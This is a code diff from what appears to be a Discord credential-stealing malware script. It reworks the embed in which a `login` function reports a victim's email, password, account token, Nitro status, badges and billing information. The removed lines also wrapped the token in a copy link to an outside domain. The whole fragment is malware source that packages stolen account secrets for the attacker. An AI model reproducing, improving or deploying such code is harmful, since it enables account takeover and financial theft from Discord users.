@@ -660,24 +660,19 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            name: '**Account Info**',
+            value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
-            value: `${badges}`,
-            inline: true,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: false,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
-            value: `\`${email}\``,
-            inline: true,
-          },
-          {
-            name: '<a:satan:846706207632261120> Password:',
-            value: `\`${password}\``,
-            inline: true,
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
           },
         ],
         author: {
